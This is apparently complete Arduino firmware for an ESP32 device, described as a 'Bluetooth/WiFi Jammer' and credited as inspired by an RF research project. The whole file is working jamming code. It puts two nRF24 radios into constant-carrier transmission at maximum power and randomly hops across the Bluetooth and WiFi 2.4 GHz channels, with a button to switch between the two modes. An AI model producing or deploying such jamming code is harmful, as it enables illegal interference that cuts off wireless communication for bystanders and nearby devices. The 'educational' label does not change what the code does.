/*
  Project: WhiteRabbit Bluetooth/WiFi Jammer
  Creator: x0jacob0x

  Special thanks to the RF-Clown project
  by cifertech:
  https://github.com/cifertech/RF-Clown

  Inspired by RF-Clown for educational RF research.
*/

#include "RF24.h"
#include <SPI.h>
#include "esp_bt.h"
#include "esp_wifi.h"
#include <Adafruit_NeoPixel.h>

constexpr int SPI_SPEED = 8000000;

// Shared SPI bus
constexpr int SCK_PIN  = 6;
constexpr int MOSI_PIN = 7;
constexpr int MISO_PIN = 2;

// NRF-1 (LEFT)
constexpr int CE1_PIN  = 10;
constexpr int CSN1_PIN = 17;

// NRF-2 (RIGHT)
constexpr int CE2_PIN  = 11;
constexpr int CSN2_PIN = 16;

#define BOOT_BUTTON 9

bool wifiMode = false;  // false = Bluetooth/BLE, true = WiFi
bool lastButtonState = HIGH;
unsigned long lastPressTime = 0;
const unsigned long debounceDelay = 250;

SPIClass *spiFSPI = nullptr;

RF24 radio1(CE1_PIN, CSN1_PIN, SPI_SPEED);
RF24 radio2(CE2_PIN, CSN2_PIN, SPI_SPEED);

int bluetooth_channels[] = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
int WiFi_channels[] = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};

#define RGB_LED_PIN 8
#define NUM_LEDS 1

Adafruit_NeoPixel rgb(NUM_LEDS, RGB_LED_PIN, NEO_GRB + NEO_KHZ800);

void configureRadio(RF24 &radio, int channel, SPIClass *spi);
void test();
void test1();

void setup() {
    Serial.begin(115200);
    delay(1000);

    pinMode(BOOT_BUTTON, INPUT_PULLUP);

    rgb.begin();
    rgb.setBrightness(50);
    rgb.setPixelColor(0, rgb.Color(255, 255, 255));  // waiting = white
    rgb.show();

    while (digitalRead(BOOT_BUTTON) == HIGH) {
        delay(10);
    }

    while (digitalRead(BOOT_BUTTON) == LOW) {
        delay(10);
    }

    wifiMode = false;
    lastButtonState = HIGH;
    lastPressTime = millis();

    rgb.setPixelColor(0, rgb.Color(0, 0, 255));  // Bluetooth/BLE = blue
    rgb.show();

    esp_bt_controller_deinit();
    esp_wifi_stop();
    esp_wifi_deinit();
    esp_wifi_disconnect();

    spiFSPI = new SPIClass(FSPI);
    spiFSPI->begin(SCK_PIN, MISO_PIN, MOSI_PIN);

    configureRadio(radio1, bluetooth_channels[0], spiFSPI);
    configureRadio(radio2, bluetooth_channels[0], spiFSPI);
}

void configureRadio(RF24 &radio, int channel, SPIClass *spi) {
    if (radio.begin(spi)) {
        radio.setAutoAck(false);
        radio.stopListening();
        radio.setRetries(0, 0);
        radio.setPALevel(RF24_PA_MAX, true);
        radio.setDataRate(RF24_2MBPS);
        radio.setCRCLength(RF24_CRC_DISABLED);
        radio.startConstCarrier(RF24_PA_HIGH, channel);
    }
}

void loop() {
    bool buttonState = digitalRead(BOOT_BUTTON);

    if (buttonState == LOW && lastButtonState == HIGH) {
        if (millis() - lastPressTime > debounceDelay) {
            wifiMode = !wifiMode;

            if (wifiMode) {
                rgb.setPixelColor(0, rgb.Color(255, 0, 0));  // WiFi = red
            } else {
                rgb.setPixelColor(0, rgb.Color(0, 0, 255));  // Bluetooth/BLE = blue
            }

            rgb.show();
            lastPressTime = millis();
        }
    }

    lastButtonState = buttonState;

    if (wifiMode) {
        jamWiFi();
    } else {
        jamBluetooth();
    }
}

void jamWiFi() {
    int randomIndex = random(0, sizeof(WiFi_channels) / sizeof(WiFi_channels[0]));
    int channel = WiFi_channels[randomIndex];

    radio1.setChannel(channel);
    radio2.setChannel(channel);
}

void jamBluetooth() {
    int randomIndex = random(0, sizeof(bluetooth_channels) / sizeof(bluetooth_channels[0]));
    int channel = bluetooth_channels[randomIndex];

    radio1.setChannel(channel);
    radio2.setChannel(channel);
}
